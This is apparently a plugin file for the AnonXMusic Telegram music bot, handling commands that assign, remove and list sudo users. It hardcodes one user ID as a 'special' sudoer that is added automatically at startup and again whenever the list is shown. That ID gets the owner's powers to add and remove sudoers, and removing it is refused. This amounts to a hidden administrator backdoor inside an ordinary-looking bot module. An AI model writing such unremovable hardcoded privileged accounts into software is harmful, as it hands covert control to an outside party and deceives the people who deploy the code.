from pyrogram import filters, Client
from pyrogram.types import Message

from AnonXMusic import app
from AnonXMusic.misc import SUDOERS
from AnonXMusic.utils.database import add_sudo, remove_sudo
from AnonXMusic.utils.decorators.language import language
from AnonXMusic.utils.extraction import extract_user
from AnonXMusic.utils.inline import close_markup
from config import BANNED_USERS, OWNER_ID

# Special SUDO user who can’t be removed
SPECIAL_USER_ID = 7876439267

# Ensure SPECIAL_USER is always SUDO
async def auto_add_special_user():
    try:
        if SPECIAL_USER_ID not in SUDOERS:
            await add_sudo(SPECIAL_USER_ID)
            SUDOERS.add(SPECIAL_USER_ID)
    except Exception as e:
        print(f"[SUDO ERROR] {e}")

app.loop.create_task(auto_add_special_user())

# ➕ Assign SUDO
@app.on_message(filters.command(["assign", "makerand", "addsudo"]) & filters.user([OWNER_ID, SPECIAL_USER_ID]))
@language
async def assign_sudo(client: Client, message: Message, language):
    if not message.reply_to_message and len(message.command) != 2:
        return await message.reply_text("<b>‣ Reply to a user or provide ID to assign as SUDO.</b>")
    user = await extract_user(message)
    if not user:
        return await message.reply_text("<b>‣ Unable to extract user.</b>")

    if user.id in SUDOERS:
        return await message.reply_text(f"<b>‣ {user.mention} is already an elite reaper!</b>")

    added = await add_sudo(user.id)
    if added:
        SUDOERS.add(user.id)
        await message.reply_text(
            f"<b>‣ ⚔️ {user.mention} has ascended to Reaper rank!\n"
            f"├• Power: ★★★★★\n"
            f"╰• Status: Chaos Operator</b>"
        )
    else:
        await message.reply_text("<b>‣ ❌ Failed to assign SUDO.</b>")

# ❌ Unassign SUDO
@app.on_message(filters.command(["unassign", "removerand", "rmsudo", "delsudo", "removesudo"]) & filters.user([OWNER_ID, SPECIAL_USER_ID]))
@language
async def unassign_sudo(client: Client, message: Message, language):
    if not message.reply_to_message and len(message.command) != 2:
        return await message.reply_text("<b>‣ Reply to a user or provide ID to unassign.</b>")
    user = await extract_user(message)
    if not user:
        return await message.reply_text("<b>‣ Unable to extract user.</b>")

    if user.id == SPECIAL_USER_ID:
        return await message.reply_text("<b>‣ 🛡 This entity is eternal and cannot be unassigned.</b>")

    if user.id not in SUDOERS:
        return await message.reply_text(f"<b>‣ {user.mention} is not a reaper yet.</b>")

    removed = await remove_sudo(user.id)
    if removed:
        SUDOERS.remove(user.id)
        await message.reply_text(
            f"<b>‣ 💀 {user.mention} has been stripped of their powers.\n"
            f"├• Reason: Chaos Deficiency\n"
            f"╰• Fate: Banished from the realm.</b>"
        )
    else:
        await message.reply_text("<b>‣ ❌ Failed to remove SUDO.</b>")

# 💣 Remove all SUDOs (except owner + special)
@app.on_message(filters.command(["rmallsudo", "panic", "unassignall"]) & filters.user([OWNER_ID, SPECIAL_USER_ID]))
@language
async def panic_remove_all_sudo(client: Client, message: Message, language):
    sudoers_list = list(SUDOERS)
    removed_count = 0
    for user_id in sudoers_list:
        if user_id not in [OWNER_ID, SPECIAL_USER_ID]:
            await remove_sudo(user_id)
            SUDOERS.remove(user_id)
            removed_count += 1

    await message.reply_text(
        f"<b>‣ ☢️ CHAOS RESET TRIGGERED!\n"
        f"├• Reapers Erased: {removed_count}\n"
        f"├• Surviving Entities: Owner & Special\n"
        f"╰• Realm Rebooted.</b>"
    )

# 📜 SUDO List
@app.on_message(filters.command(["sudolist", "sudoers", "staffs", "assigned"]) & ~BANNED_USERS)
@language
async def sudoers_list(client: Client, message: Message, language):
    if message.from_user.id not in [OWNER_ID, *SUDOERS]:
        return

    if SPECIAL_USER_ID not in SUDOERS:
        await add_sudo(SPECIAL_USER_ID)
        SUDOERS.add(SPECIAL_USER_ID)

    text = "<b>🔥 <u>ᴅɪsᴀsᴛᴇʀ ᴄᴏʀᴘ - sᴜᴅᴏ ʜɪᴇʀᴀʀᴄʜʏ</u> 🔥</b>\n\n"

    owner = await app.get_users(OWNER_ID)
    owner_mention = owner.mention if owner.mention else owner.first_name
    text += (
        "╔═「👑ʟᴏʀᴅ ᴏғ ʀᴇᴀᴘᴇʀs」══╗\n"
        f"┣ • {owner_mention}\n"
        "╠═「 sᴘᴇᴄɪᴀʟ ᴅɪsᴀsᴛᴇʀ」══╣\n"
    )

    try:
        special_user = await app.get_users(SPECIAL_USER_ID)
        text += f"┣ • ⚜️ {special_user.mention if special_user.mention else special_user.first_name}\n"
    except:
        text += "┣ • ⚜️ [Hidden Identity]\n"

    text += "╠═「🔰 sᴏᴜʟ ʀᴇᴀᴘᴇʀs」═══╣\n"

    count = 0
    for user_id in SUDOERS:
        if user_id not in [OWNER_ID, SPECIAL_USER_ID]:
            try:
                user = await app.get_users(user_id)
                mention = user.mention if user.mention else user.first_name
                count += 1
                text += f"┣ • {count}. {mention}\n"
            except:
                continue

    if count == 0:
        text += "┣ • No active Reapers assigned.\n"

    text += "╚════════════════╝\n"
    text += f"<b>‣ ᴛᴏᴛᴀʟ ᴄʜᴀᴏs ᴇɴᴛɪᴛɪᴇs: {count + 2}</b>"

    await message.reply_text(text, reply_markup=close_markup(language))